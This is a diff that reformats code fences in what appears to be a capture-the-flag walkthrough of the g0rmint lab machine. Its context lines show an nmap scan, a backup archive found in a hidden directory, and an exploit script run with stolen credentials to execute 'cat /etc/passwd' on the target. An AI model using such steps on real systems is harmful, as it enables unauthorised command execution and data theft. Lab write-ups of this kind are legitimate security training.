@@ -22,8 +22,7 @@ Let's kick this off with a `nmap` scan to establish the services available in th
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
-```
-```
+...
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -145,8 +144,6 @@ The backup archive can be downloaded at `/g0rmint/s3cretbackupdirect0ry/backup.z
 
 ```
 # unzip -l backup.zip 
-```
-```
 Archive:  backup.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
@@ -453,8 +450,6 @@ Simply supply the email, password and command as arguments and the script would 
 
 ```
 # ./exploit.sh w3bdrill3r@gmail.com 30e1a63a8968b727f276 "cat /etc/passwd"
-```
-```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -509,8 +504,6 @@ Next, I downloaded the file using `wget`.
 
 ```
 # wget http://192.168.198.130/backup.zip
-```
-```
 --2018-02-02 14:46:19-- http://192.168.198.130/backup.zip
 Connecting to 192.168.198.130:80... connected.
 HTTP request sent, awaiting response... 200 OK
